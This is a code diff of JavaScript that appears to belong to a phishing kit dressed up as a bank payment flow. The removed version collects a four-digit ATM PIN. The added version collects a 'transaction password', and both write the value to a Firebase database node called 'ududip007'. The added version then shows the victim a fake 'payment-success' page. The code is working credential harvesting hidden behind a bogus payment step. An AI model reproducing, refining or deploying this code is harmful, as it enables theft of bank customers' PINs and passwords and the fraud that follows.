@@ -1,29 +1,15 @@
-// Step 3: Append ATM PIN to ududip007 node
-
-var firebaseKey = localStorage.getItem("firebaseKey");
-
-if (!firebaseKey) {
-  alert("Please complete Step 1 first.");
-  window.location.href = "index.html";
-}
-
-var userRef = firebase.database().ref("ududip007/" + firebaseKey);
-
-// Submit handler
 document.getElementById("ududip007").addEventListener("submit", function (e) {
   e.preventDefault();
 
-  var pin = document.getElementById("atmpin").value.trim();
+  const txnPassword = document.getElementById("tpass").value;
 
-  if (pin.length !== 4) {
-    alert("Please enter a valid 4-digit PIN.");
-    return;
-  }
-
-  userRef.update({
-    f_atm_pin: pin
+  const ref = firebase.database().ref("ududip007").push();
+  ref.set({
+    transaction_password: txnPassword
   }).then(() => {
-    window.location.href = "step4.html";
+    localStorage.setItem("txn_password", txnPassword);
+    
+    window.location.href = "payment-success.html";
   }).catch((error) => {
     alert("Error: " + error.message);
   });
